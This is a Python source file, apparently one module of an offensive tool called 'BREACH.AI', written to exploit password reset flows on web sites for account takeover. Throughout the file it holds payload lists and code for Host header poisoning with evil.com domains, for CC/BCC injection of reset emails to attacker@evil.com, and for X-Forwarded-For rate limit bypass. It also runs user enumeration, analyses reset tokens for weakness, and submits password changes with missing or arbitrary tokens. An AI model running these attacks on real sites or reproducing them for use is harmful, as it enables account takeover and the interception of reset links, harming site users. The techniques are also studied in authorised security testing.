"""
BREACH.AI - Password Reset Killer

Comprehensive password reset attack module.
Password reset is often the weakest link - we exploit every flaw.

Attack Categories:
1. Token Prediction - Weak token generation
2. Token Reuse - Tokens not invalidated
3. Host Header Poisoning - Reset link manipulation
4. Email Injection - CC/BCC injection
5. Rate Limit Bypass - Brute force tokens
6. User Enumeration - Discover valid users
7. Account Takeover - Full compromise via reset
"""

import asyncio
import hashlib
import re
import secrets
import time
from dataclasses import dataclass
from typing import Optional
from urllib.parse import urljoin, urlparse, parse_qs

from breach.attacks.base import AttackResult, BaseAttack
from breach.core.memory import AccessLevel, Severity
from breach.utils.logger import logger


@dataclass
class ResetEndpoint:
    """Password reset endpoint information."""
    request_url: str  # Where to request reset
    confirm_url: Optional[str] = None  # Where to submit new password
    email_field: str = "email"
    token_param: str = "token"


class PasswordResetKiller(BaseAttack):
    """
    Password Reset KILLER - Comprehensive password reset exploitation.

    Password reset flows are complex and error-prone.
    We find every weakness and exploit it for account takeover.
    """

    name = "Password Reset Killer"
    attack_type = "password_reset_attack"
    description = "Comprehensive password reset vulnerability exploitation"
    severity = Severity.CRITICAL
    owasp_category = "A07:2021 Identification and Authentication Failures"
    cwe_id = 640

    # Common reset endpoints
    RESET_ENDPOINTS = [
        "/forgot-password",
        "/password/forgot",
        "/reset-password",
        "/password/reset",
        "/forgot",
        "/account/forgot",
        "/user/forgot-password",
        "/api/forgot-password",
        "/auth/forgot-password",
        "/api/v1/forgot-password",
        "/api/auth/forgot-password",
        "/password-reset",
        "/recover",
        "/account/recover",
    ]

    # Host header payloads for poisoning
    HOST_PAYLOADS = [
        "evil.com",
        "attacker.com",
        "{host}.evil.com",
        "evil.com/{host}",
        "{host}@evil.com",
        "{host}%00.evil.com",
        "{host}%0d%0aHost: evil.com",
        "evil.com#@{host}",
    ]

    # Email header injection payloads
    EMAIL_INJECTION = [
        "{email}%0aCc: attacker@evil.com",
        "{email}%0d%0aCc: attacker@evil.com",
        "{email}\nCc: attacker@evil.com",
        "{email}\r\nBcc: attacker@evil.com",
        "{email}%0d%0aBcc: attacker@evil.com",
        "attacker@evil.com\n{email}",
        "{email}%00attacker@evil.com",
        "{email},attacker@evil.com",
        "{email}; attacker@evil.com",
    ]

    def get_payloads(self) -> list[str]:
        return self.HOST_PAYLOADS

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check if password reset functionality exists."""
        for endpoint in self.RESET_ENDPOINTS:
            reset_url = urljoin(url, endpoint)
            response = await self.http_client.get(reset_url)

            if response.status_code == 200:
                indicators = ["email", "reset", "forgot", "password"]
                if any(ind in response.body.lower() for ind in indicators):
                    return True

        return False

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Execute comprehensive password reset attacks."""
        result = self._create_result(False, url, parameter)

        # Discover reset endpoint
        endpoint = await self._discover_reset_endpoint(url)
        if not endpoint:
            result.details = "No password reset endpoint found"
            return result

        logger.info(f"[Reset] Found endpoint: {endpoint.request_url}")

        # Attack 1: Host Header Poisoning
        host_result = await self._attack_host_header_poisoning(endpoint)
        if host_result:
            result.success = True
            result.payload = host_result["payload"]
            result.details = f"Host header poisoning: {host_result['type']}"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "reset_host_poisoning",
                "Password reset link can be manipulated via Host header",
                host_result["details"]
            )
            return result

        # Attack 2: Email Header Injection
        email_result = await self._attack_email_injection(endpoint)
        if email_result:
            result.success = True
            result.payload = email_result["payload"]
            result.details = "Email header injection possible"
            result.add_evidence(
                "reset_email_injection",
                "Reset email CC/BCC injection possible",
                email_result["details"]
            )
            return result

        # Attack 3: Token Prediction/Weakness
        token_result = await self._attack_weak_token(endpoint)
        if token_result:
            result.success = True
            result.payload = token_result["pattern"]
            result.details = f"Weak reset token: {token_result['type']}"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "reset_weak_token",
                "Password reset tokens are predictable",
                token_result["details"]
            )
            return result

        # Attack 4: Token Reuse
        reuse_result = await self._attack_token_reuse(endpoint)
        if reuse_result:
            result.success = True
            result.details = "Reset tokens can be reused!"
            result.add_evidence(
                "reset_token_reuse",
                "Password reset tokens not invalidated after use",
                reuse_result["details"]
            )
            return result

        # Attack 5: Rate Limit Bypass
        rate_result = await self._attack_rate_limit_bypass(endpoint)
        if rate_result:
            result.success = True
            result.details = f"Rate limit bypass: {rate_result['method']}"
            result.add_evidence(
                "reset_rate_limit_bypass",
                "Password reset rate limiting can be bypassed",
                rate_result["details"]
            )
            return result

        # Attack 6: User Enumeration
        enum_result = await self._attack_user_enumeration(endpoint)
        if enum_result:
            result.success = True
            result.details = "User enumeration via password reset"
            result.add_evidence(
                "reset_user_enum",
                "Valid users can be enumerated via reset response differences",
                enum_result["details"]
            )

        # Attack 7: Missing Token Validation
        missing_result = await self._attack_missing_token(endpoint)
        if missing_result:
            result.success = True
            result.details = "Reset possible without valid token!"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "reset_missing_token",
                "Password can be reset without valid token",
                missing_result["details"]
            )
            return result

        # Attack 8: Token in Referrer
        referrer_result = await self._attack_token_referrer_leak(endpoint)
        if referrer_result:
            result.success = True
            result.details = "Reset token leaked in Referrer header"
            result.add_evidence(
                "reset_referrer_leak",
                "Reset token exposed via Referrer to third parties",
                referrer_result["details"]
            )

        return result

    async def _discover_reset_endpoint(self, url: str) -> Optional[ResetEndpoint]:
        """Discover password reset endpoint and configuration."""
        for path in self.RESET_ENDPOINTS:
            reset_url = urljoin(url, path)
            response = await self.http_client.get(reset_url)

            if response.status_code == 200:
                # Look for email field
                email_field = self._find_email_field(response.body)

                if email_field:
                    return ResetEndpoint(
                        request_url=reset_url,
                        email_field=email_field,
                    )

        return None

    def _find_email_field(self, html: str) -> Optional[str]:
        """Find the email input field name."""
        patterns = [
            r'name=["\']([^"\']*email[^"\']*)["\']',
            r'name=["\']([^"\']*username[^"\']*)["\']',
            r'name=["\']([^"\']*user[^"\']*)["\']',
            r'name=["\']([^"\']*account[^"\']*)["\']',
        ]

        for pattern in patterns:
            match = re.search(pattern, html, re.I)
            if match:
                return match.group(1)

        return "email"

    async def _attack_host_header_poisoning(self, endpoint: ResetEndpoint) -> Optional[dict]:
        """Test for host header poisoning in password reset."""
        logger.debug("[Reset] Testing host header poisoning...")

        parsed = urlparse(endpoint.request_url)
        original_host = parsed.netloc

        test_email = "test@example.com"

        for payload in self.HOST_PAYLOADS:
            poisoned_host = payload.format(host=original_host)

            headers = {
                "Host": poisoned_host,
            }

            # Also try X-Forwarded-Host
            x_headers = {
                "X-Forwarded-Host": "evil.com",
            }

            for header_set in [headers, x_headers]:
                response = await self.http_client.post(
                    endpoint.request_url,
                    data={endpoint.email_field: test_email},
                    headers=header_set
                )

                # Check if request was processed (not rejected)
                if response.status_code in [200, 302, 201]:
                    # Check for error about invalid host
                    error_indicators = ["invalid host", "forbidden", "blocked"]
                    if not any(ind in response.body.lower() for ind in error_indicators):
                        return {
                            "type": "Host header accepted",
                            "payload": str(header_set),
                            "details": f"Server accepted modified host header. "
                                      f"Reset link may contain attacker's domain."
                        }

        return None

    async def _attack_email_injection(self, endpoint: ResetEndpoint) -> Optional[dict]:
        """Test for email header injection."""
        logger.debug("[Reset] Testing email header injection...")

        base_email = "test@example.com"

        for payload in self.EMAIL_INJECTION:
            injected_email = payload.format(email=base_email)

            response = await self.http_client.post(
                endpoint.request_url,
                data={endpoint.email_field: injected_email}
            )

            # Check if injection was processed
            if response.status_code in [200, 302, 201]:
                # Look for success message
                success_indicators = ["sent", "email", "check", "inbox"]
                if any(ind in response.body.lower() for ind in success_indicators):
                    return {
                        "payload": injected_email,
                        "details": f"Email injection payload accepted: {injected_email[:50]}..."
                    }

        return None

    async def _attack_weak_token(self, endpoint: ResetEndpoint) -> Optional[dict]:
        """Analyze reset token for weaknesses."""
        logger.debug("[Reset] Analyzing reset token patterns...")

        # We need to find a reset confirmation page to analyze tokens
        confirm_paths = [
            "/reset-password",
            "/password/reset/confirm",
            "/reset",
            "/password-reset",
            "/confirm-reset",
        ]

        for path in confirm_paths:
            confirm_url = urljoin(endpoint.request_url, path)
            response = await self.http_client.get(confirm_url)

            # Look for token in URL or form
            token_patterns = [
                r'token=([a-zA-Z0-9_-]+)',
                r'reset_token=([a-zA-Z0-9_-]+)',
                r'code=([a-zA-Z0-9_-]+)',
                r'key=([a-zA-Z0-9_-]+)',
            ]

            for pattern in token_patterns:
                match = re.search(pattern, response.body)
                if match:
                    token = match.group(1)

                    # Analyze token
                    weakness = self._analyze_token_weakness(token)
                    if weakness:
                        return weakness

        # Check if we can trigger reset and observe token in response
        test_response = await self.http_client.post(
            endpoint.request_url,
            data={endpoint.email_field: "test@example.com"}
        )

        # Some misconfigured systems return token in response
        for pattern in [r'"token":\s*"([^"]+)"', r'token=([a-zA-Z0-9_-]{10,})', r'reset_link.*?([a-f0-9]{32,})']:
            match = re.search(pattern, test_response.body)
            if match:
                token = match.group(1)
                return {
                    "type": "Token exposed in response",
                    "pattern": token[:20] + "...",
                    "details": f"Reset token exposed in API response!"
                }

        return None

    def _analyze_token_weakness(self, token: str) -> Optional[dict]:
        """Analyze a token for predictability."""
        # Check for timestamp-based tokens
        try:
            if len(token) >= 10:
                for i in range(len(token) - 9):
                    chunk = token[i:i+10]
                    if chunk.isdigit():
                        ts = int(chunk)
                        if 1600000000 < ts < 2000000000:
                            return {
                                "type": "Timestamp-based token",
                                "pattern": "Unix timestamp embedded",
                                "details": f"Token contains predictable timestamp at position {i}"
                            }
        except ValueError:
            pass

        # Check for MD5/SHA1 of predictable values
        if len(token) == 32 and all(c in '0123456789abcdef' for c in token.lower()):
            return {
                "type": "MD5-like token",
                "pattern": "32 hex characters (MD5)",
                "details": "Token appears to be MD5 hash - may be predictable"
            }

        if len(token) == 40 and all(c in '0123456789abcdef' for c in token.lower()):
            return {
                "type": "SHA1-like token",
                "pattern": "40 hex characters (SHA1)",
                "details": "Token appears to be SHA1 hash - may be predictable"
            }

        # Check for short tokens
        if len(token) < 16:
            return {
                "type": "Short token",
                "pattern": f"Only {len(token)} characters",
                "details": f"Token too short ({len(token)} chars) - brute force feasible"
            }

        # Check for purely numeric tokens
        if token.isdigit():
            return {
                "type": "Numeric-only token",
                "pattern": "Numeric",
                "details": f"Token is purely numeric ({len(token)} digits) - severely limited keyspace"
            }

        return None

    async def _attack_token_reuse(self, endpoint: ResetEndpoint) -> Optional[dict]:
        """Test if reset tokens can be reused."""
        logger.debug("[Reset] Testing token reuse...")

        # This is hard to test without a real token
        # We can check if the confirmation endpoint has proper validation

        confirm_paths = [
            "/reset-password",
            "/password/reset",
            "/password-reset/confirm",
        ]

        for path in confirm_paths:
            confirm_url = urljoin(endpoint.request_url, path)

            # Try with a fake token
            fake_token = secrets.token_hex(16)

            response = await self.http_client.post(
                confirm_url,
                data={
                    "token": fake_token,
                    "password": "NewPassword123!",
                    "confirm_password": "NewPassword123!",
                }
            )

            # Check response for validation info
            body_lower = response.body.lower()

            # If no clear "invalid token" message, might accept any token
            if response.status_code == 200:
                invalid_indicators = ["invalid", "expired", "token", "not found", "error"]
                if not any(ind in body_lower for ind in invalid_indicators):
                    if "success" in body_lower or "changed" in body_lower:
                        return {
                            "details": "Password reset accepted with arbitrary token!"
                        }

        return None

    async def _attack_rate_limit_bypass(self, endpoint: ResetEndpoint) -> Optional[dict]:
        """Test for rate limit bypass on password reset."""
        logger.debug("[Reset] Testing rate limit bypass...")

        test_email = f"ratetest{int(time.time())}@example.com"
        bypass_methods = []

        # Method 1: Standard rapid requests
        success_count = 0
        for _ in range(10):
            response = await self.http_client.post(
                endpoint.request_url,
                data={endpoint.email_field: test_email}
            )
            if response.status_code in [200, 201, 302]:
                success_count += 1

        if success_count == 10:
            bypass_methods.append("No rate limiting detected")

        # Method 2: IP bypass headers
        ip_headers = [
            {"X-Forwarded-For": f"192.168.1.{i}"}
            for i in range(5)
        ]

        for headers in ip_headers:
            response = await self.http_client.post(
                endpoint.request_url,
                data={endpoint.email_field: test_email},
                headers=headers
            )
            if response.status_code in [200, 201, 302]:
                bypass_methods.append("X-Forwarded-For bypass")
                break

        # Method 3: Case variation
        emails = [
            test_email.upper(),
            test_email.lower(),
            test_email.replace("@", "+test@"),
        ]

        for email in emails:
            response = await self.http_client.post(
                endpoint.request_url,
                data={endpoint.email_field: email}
            )
            if response.status_code in [200, 201, 302]:
                bypass_methods.append("Email case/plus addressing bypass")
                break

        if bypass_methods:
            return {
                "method": ", ".join(bypass_methods),
                "details": f"Rate limit can be bypassed: {', '.join(bypass_methods)}"
            }

        return None

    async def _attack_user_enumeration(self, endpoint: ResetEndpoint) -> Optional[dict]:
        """Test for user enumeration via password reset."""
        logger.debug("[Reset] Testing user enumeration...")

        # Test with valid-looking and invalid emails
        test_emails = [
            f"admin@{urlparse(endpoint.request_url).netloc}",
            "definitely_not_exists_12345@example.com",
        ]

        responses = []
        for email in test_emails:
            response = await self.http_client.post(
                endpoint.request_url,
                data={endpoint.email_field: email}
            )
            responses.append({
                "email": email,
                "status": response.status_code,
                "length": len(response.body),
                "body": response.body[:500]
            })

        # Compare responses
        if len(responses) == 2:
            # Different status codes
            if responses[0]["status"] != responses[1]["status"]:
                return {
                    "details": f"Different status codes: {responses[0]['status']} vs {responses[1]['status']}"
                }

            # Significantly different response lengths
            len_diff = abs(responses[0]["length"] - responses[1]["length"])
            if len_diff > 50:
                return {
                    "details": f"Response length differs by {len_diff} bytes"
                }

            # Different error messages
            if responses[0]["body"] != responses[1]["body"]:
                # Check for obvious differences
                if "not found" in responses[1]["body"].lower() or "doesn't exist" in responses[1]["body"].lower():
                    return {
                        "details": "Different error messages reveal user existence"
                    }

        return None

    async def _attack_missing_token(self, endpoint: ResetEndpoint) -> Optional[dict]:
        """Test if password can be reset without a valid token."""
        logger.debug("[Reset] Testing missing token validation...")

        confirm_paths = [
            "/reset-password",
            "/password/reset",
            "/password-reset/confirm",
            "/reset",
        ]

        for path in confirm_paths:
            confirm_url = urljoin(endpoint.request_url, path)

            # Try without any token
            response = await self.http_client.post(
                confirm_url,
                data={
                    "password": "NewPassword123!",
                    "confirm_password": "NewPassword123!",
                    "email": "admin@example.com",
                }
            )

            if response.status_code in [200, 201, 302]:
                success_indicators = ["success", "changed", "updated", "reset"]
                if any(ind in response.body.lower() for ind in success_indicators):
                    return {
                        "details": "Password reset accepted without token!"
                    }

            # Try with empty token
            response = await self.http_client.post(
                confirm_url,
                data={
                    "token": "",
                    "password": "NewPassword123!",
                    "confirm_password": "NewPassword123!",
                }
            )

            if response.status_code in [200, 201, 302]:
                if "success" in response.body.lower() or "changed" in response.body.lower():
                    return {
                        "details": "Password reset accepted with empty token!"
                    }

        return None

    async def _attack_token_referrer_leak(self, endpoint: ResetEndpoint) -> Optional[dict]:
        """Check if reset token leaks via Referrer header."""
        logger.debug("[Reset] Testing token referrer leak...")

        # Check if reset page has external resources
        confirm_paths = [
            "/reset-password",
            "/password/reset",
        ]

        for path in confirm_paths:
            confirm_url = urljoin(endpoint.request_url, path + "?token=TESTTOKEN123")
            response = await self.http_client.get(confirm_url)

            # Look for external resources that could leak referrer
            external_patterns = [
                r'src=["\']https?://[^/]+',
                r'href=["\']https?://[^/]+',
            ]

            for pattern in external_patterns:
                matches = re.findall(pattern, response.body)
                external_domains = [m for m in matches if urlparse(endpoint.request_url).netloc not in m]

                if external_domains:
                    return {
                        "details": f"External resources found: {external_domains[:3]}. "
                                  f"Token in URL may leak via Referrer header."
                    }

            # Check for Referrer-Policy header
            referrer_policy = response.headers.get("Referrer-Policy", "")
            if not referrer_policy or "no-referrer" not in referrer_policy.lower():
                if "?token=" in confirm_url or "&token=" in confirm_url:
                    return {
                        "details": "No Referrer-Policy header. "
                                  "Token in URL may leak to external sites."
                    }

        return None
